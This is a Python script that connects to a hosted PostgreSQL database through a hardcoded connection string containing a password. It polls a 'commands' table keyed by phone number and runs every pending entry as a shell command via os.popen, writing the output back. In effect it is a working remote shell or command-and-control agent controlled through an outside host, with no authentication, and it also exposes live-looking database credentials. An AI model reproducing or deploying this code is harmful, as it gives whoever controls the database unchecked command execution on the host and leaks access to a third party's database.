import psycopg2
import os
import time

# Database connection details
DATABASE_URL = "postgres://default:Z2qBOaWyo7VI@ep-plain-queen-a47orz11.us-east-1.aws.neon.tech:5432/verceldb?sslmode=require"

# Connect to the PostgreSQL database
conn = psycopg2.connect(DATABASE_URL)
cursor = conn.cursor()

# Function to create necessary tables
def create_tables():
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS commands (
        id SERIAL PRIMARY KEY,
        phone_number VARCHAR(20) NOT NULL,
        command TEXT NOT NULL,
        response TEXT
    );
    """)
    conn.commit()

# Prompt user for phone number
phone_number = input("Enter your phone number: ")

# Function to send message to the database
def send_message(phone_number, message):
    cursor.execute("""
    INSERT INTO commands (phone_number, command)
    VALUES (%s, %s);
    """, (phone_number, message))
    conn.commit()

# Function to get the latest command for a phone number
def get_latest_command(phone_number):
    cursor.execute("""
    SELECT id, command FROM commands
    WHERE phone_number = %s AND response IS NULL
    ORDER BY id ASC LIMIT 1;
    """, (phone_number,))
    result = cursor.fetchone()
    return result

# Function to update the response of a command
def update_response(command_id, response):
    cursor.execute("""
    UPDATE commands
    SET response = %s
    WHERE id = %s;
    """, (response, command_id))
    conn.commit()

# Create tables if they don't exist
create_tables()

# Send initial message
send_message(phone_number, "operate me")

print(f"Message sent to {phone_number}. Waiting for replies...")

# Continuously check for new commands
while True:
    command_data = get_latest_command(phone_number)
    if command_data:
        command_id, command = command_data
        print(f"Executing command: {command}")

        try:
            # Execute the command
            output = os.popen(command).read()
            print(f"Command output: {output}")
        except Exception as e:
            output = str(e)
            print(f"Error executing command: {output}")

        # Update the response in the database
        update_response(command_id, output)

    # Wait for a short period before checking again
    time.sleep(5)
